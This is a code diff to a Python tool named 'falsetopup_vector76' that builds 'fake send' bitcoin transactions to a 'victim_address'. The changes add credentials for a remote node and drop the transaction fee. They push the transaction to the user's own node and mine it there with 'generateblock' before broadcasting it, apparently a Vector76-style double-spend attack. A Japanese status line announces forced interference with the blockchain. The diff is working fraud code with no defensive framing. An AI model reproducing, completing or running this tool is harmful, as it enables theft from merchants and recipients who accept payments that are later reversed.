@@ -8,9 +8,19 @@ import uuid
 
 import bitcoin.rpc
 
-from bs4 import BeautifulSoup
-
-parser = argparse.ArgumentParser(description="How To Use falsetopup")
+parser = argparse.ArgumentParser(description="How To Use falsetopup_vector76")
+parser.add_argument("node_host",
+                    help="Blockchain Node Host",
+                    type=str)
+parser.add_argument("node_port",
+                    help="Blockchain Node Port",
+                    type=int)
+parser.add_argument("username",
+                    help="Public node username",
+                    type=str)
+parser.add_argument("password",
+                    help="Public node password",
+                    type=str)
 parser.add_argument("send_from_wifkey",
                     help="Fake send btc from wif key.",
                     type=str)
@@ -74,6 +84,11 @@ def broadcast_transaction(raw_tx, testnet):
 
 
 args = parser.parse_args()
+rpc_host = args.node_host
+rpc_port = args.node_port
+username = args.username
+password = args.password
+
 fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
 amount_btc = args.amount_of_coins
@@ -84,6 +99,10 @@ if loop_count <= 0:
     loop_count = 1
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
+print("Connecting Public Node...")
+rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}:{rpc_port}",
+                 service_port=rpc_port)
+print("OK")
 balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
 inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
     #balance = transaction_util.get_balance(send_from)
@@ -100,8 +119,8 @@ if balance < send_amount:
     print(f"[!] insufficient funds. ")
     exit()
 
-fee = 1
-change_btc_amt = (balance - send_amount) - fee#おつり
+fee = 0
+change_btc_amt = (balance - send_amount)#おつり
 
 input(" --- If you really want to continue, press enter. --- ")
 
@@ -132,8 +151,12 @@ for i  in range(loop_count):
         print()
 
     print()
-
+    print("Sending rawtx      Your node...")
+    result = rpc_node.sendrawtransaction(tx=tx_victim)
+    print("Mining rawtx block Your node...")
+    rpc_node.call("generateblock", transaction_util.wiftoaddr(fake_send_from), [tx_victim])
     print()
+    input(" --- If you really want to continue, press enter. --- ") #テスト
     print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
     print()
     broadcast_transaction(tx_victim, testnet)
@@ -150,9 +173,12 @@ for i  in range(loop_count):
         import soundplay
         soundplay.playsound(sound_name)
     except:
-        # Termux Only
-        imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
-        subprocess.run(imagine_breaker_cmd)
+        try:
+            # Termux Only
+            imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
+            subprocess.run(imagine_breaker_cmd)
+        except:
+            pass
     time.sleep(1) #休ませる
 
 print("----------------")
